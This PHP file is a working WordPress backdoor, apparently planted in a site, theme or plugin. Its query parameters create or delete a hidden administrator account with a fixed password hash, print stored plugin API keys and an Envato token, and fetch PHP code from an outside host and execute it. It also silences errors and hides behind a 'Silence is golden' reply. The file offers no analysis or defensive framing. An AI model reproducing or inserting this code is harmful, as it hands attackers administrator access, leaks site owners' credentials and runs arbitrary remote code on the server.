<?php 
error_reporting(0);

if( !isset($_GET['go']) )
{

require $_SERVER['DOCUMENT_ROOT'].'/wp-load.php';
$table_name = $wpdb->get_blog_prefix();
$sample = 'a:1:{s:13:"administrator";b:1;}';
if( isset($_GET['ok']) ) { echo '<!-- Silence is golden. -->';}
if( isset($_GET['awu']) ) {
$wpdb->query("INSERT INTO $wpdb->users (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('100010010', '100010010', '\$P\$BaRp7gFRTND5AwwJwpQY8EyN3otDiL.', '100010010', 'te@ea.st', '', '2011-06-07 00:00:00', '', '0', '100010010');");
$wpdb->query("INSERT INTO $wpdb->usermeta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (100010010, '100010010', '{$table_name}capabilities', '{$sample}');");
$wpdb->query("INSERT INTO $wpdb->usermeta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '100010010', '{$table_name}user_level', '10');"); }
if( isset($_GET['dwu']) ) { $wpdb->query("DELETE FROM $wpdb->users WHERE `ID` = 100010010");
$wpdb->query("DELETE FROM $wpdb->usermeta WHERE $wpdb->usermeta.`umeta_id` = 100010010");}
if( isset($_GET['key']) ) { $options = get_option( EWPT_PLUGIN_SLUG ); echo '<center><h2>' . esc_attr( $options['user_name'] . ':' .  esc_attr( $options['api_key'])) . '<br>';
  echo esc_html( envato_market()->get_option( 'token' ) ); echo '</center></h2>'; }
  
  }
  
  if( isset($_GET['go']) )
{

if ( ! function_exists( 'wp_temp_setupx' ) ) {  
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];

if($tmpcontentx = @file_get_contents("http://www.spekt.cc/codexc.txt"))
{


function wp_temp_setupx($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "wp_temp_setupx");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(wp_temp_setupx($tmpcontentx));
}
}

  }
  
?>